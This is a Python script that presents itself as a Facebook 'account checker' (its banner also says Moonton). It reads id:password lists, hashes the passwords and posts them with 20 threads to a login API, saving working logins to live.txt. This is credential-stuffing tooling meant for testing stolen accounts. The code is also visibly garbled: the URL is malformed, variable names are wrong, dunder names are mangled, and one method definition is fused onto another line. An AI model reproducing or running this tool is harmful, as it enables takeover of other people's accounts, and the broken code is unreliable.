# coding=utf-8

###########################################################################
# Name           : crack account facebook                                 #
# File           : cek.py                                                 #
# Author         : Sam storee                                             #
# Github         : https://github.com/SammXStoreeku/SammXStoreeku         #                                     #                                        ##
###########################################################################

import os, sys, hashlib, json
from threading import activeCount

try:
  from concurrent.futures import ThreadPoolExecutor
except ImportError:
  if sys.version_info.major != 2:
    os.system('pip install futures')
    exit('Please restart this tools')
  else:
    os.system('pip2 install futures')
    exit('Please restart this tools')
try:
  import requests
except ImportError:
  if sys.version_info.major != 2:
    os.system('pip install requests')
    exit('Please restart this tools')
  else:
    os.system('pip2 install requests')
    exit('Please restart this tools')

api = 'https:///'accountapi/facebook.com/'

class facebook:
  def init(self, url):
    self.userdata = []
    self.live = []
    self.die = []
    self.api = url
    print('''\033[0m
 ##########################################################################
# Name           : Moonton Account Checker                                #
# File           : cek.py                                                 #
# Author         : Sam storee                                             #
# Github         : https://github.com/SammXStoreeku/SammStoreeku          #                                     #                                        ##
###########################################################################

---------------------------------------------
          - Created By (Samm X Code) -
---------------------------------------------
[#] TKJ Blackhat\n''')

  def main(self):
    print('[!] Pemisah id:password atau id|password\n')
    if sys.version_info.major != 2:
      crack = input('[?] List crack (ex: list.txt): ')
    else:
      crack = raw_input('[?] List crack (ex: list.txt): ')
    if os.path.exists(crack):
      for data in open(crack,'r').readlines():
        try:
          user = data.strip().split('|')
          if id[0] and id[1]:
            self.userdata.append({
              'id': user[0],
              'pw': user[1],
              'userdata': data.strip()
            })
        except IndexError:
          try:
            user = data.strip().split(':')
            if user[0] and user[1]:
              self.userdata.append({
                'id': user[0],
                'pw': user[1],
                'userdata': data.strip()
             })
          except: pass
      if len(self.userdata) == 0:
        exit('[!] crack tidak ada atau tidak valid pastikan berformat id:pass atau id|pass')
      print('[*] Total {0} account\n'.format(str(len(self.userdata))))
      with ThreadPoolExecutor(max_workers=20) as thread:
        [thread.submit(self.validate, user) for user in self.userdata]
      print('\n[#] LIVE: '+str(len(self.live))+' - saved: live.txt')
      print('[#] DIEE: '+str(len(self.die))+' - saved: die.txt')
      exit(0)
    else:
      print('[!] File tidak ditemukan "{0}"'.format(crack))

  def hash_md5(self, string):
    md5 = hashlib.new('md5')
    md5.update(string.encode('utf-8'))
    return md5.hexdigest()

  def build_params(self, user):
    md5pwd = self.hash_md5(user['pw'])
    hashed = self.hash_md5('account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd))
    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': id['pass'],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })def validate(self, user):
    try:
      data = self.build_params(user)
      response = requests.post(self.api, data=data).json()
      if response['message'] == 'Error_Success':
        print('\r[\033[92mLIVE\033[0m] '+user['userdata'])
        self.live.append(user['userdata'])
        open('live.txt','a').write(str(user['userdata'])+'\n')
      else:
        print('\r[\033[91mDIEE\033[0m] '+user['userdata'])
        self.die.append(user['userdata'])
        open('die.txt','a').write(str(user['userdata'])+'\n')
    except:
      self.validate(user)

if name == 'main':
  (facebook(api).main())
